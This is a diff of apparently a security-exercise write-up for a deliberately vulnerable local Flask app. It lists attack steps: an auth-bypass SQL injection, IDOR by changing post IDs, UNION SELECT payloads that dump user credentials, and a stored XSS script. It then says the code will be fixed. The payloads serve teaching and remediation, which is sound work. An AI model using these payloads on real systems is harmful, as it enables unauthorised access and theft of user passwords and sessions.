@@ -35,12 +35,10 @@ OR - use --> admin' --  in username and anything as password. -- classic auth by
 
 2. After logging in from a user account, change the part after view in ' http://127.0.0.1:5000/view/3 ' -- this allows to view posts of any user -- IDOR / broken access control
 
-3. On a user login, inject this into the url --> http://127.0.0.1:5000/view/3%20UNION%20SELECT%20users.id,%20users.username,%20users.password,%20users.id,%20users.username%20FROM%20users%20LIMIT%201%20OFFSET%201
- ' UNION SELECT users.id, users.username, users.password, users.id, users.username FROM users LIMIT 1 OFFSET 0'
- ' UNION SELECT users.id, users.username, users.password, users.id, users.username FROM users LIMIT 1 OFFSET 1'
- This will leak the user id and password for the users sequentially -- Dump users by SQL injection in endpoints
+3. On a user login, inject this into the url -->  ' UNION SELECT users.id, users.username, users.password, users.id, users.username FROM users LIMIT 1 OFFSET 0' OR ' UNION SELECT users.id, users.username, users.password, users.id, users.username FROM users LIMIT 1 OFFSET 1'
+This will leak the user id and password for the users sequentially -- Dump users by SQL injection in endpoints
  
-4. Create a post in any user account as -- content = <script>alert('XSS attack ! Attacker can send the session cookie to their machine. ');</script>
+5. Create a post in any user account as -- content = <script>alert('XSS attack ! Attacker can send the session cookie to their machine. ');</script>
  Classic XSS since the view content mode has XSS sink enabled ( | safe )
 
 To Fix the code we will make changes in the main.py code to secure the webapp. 
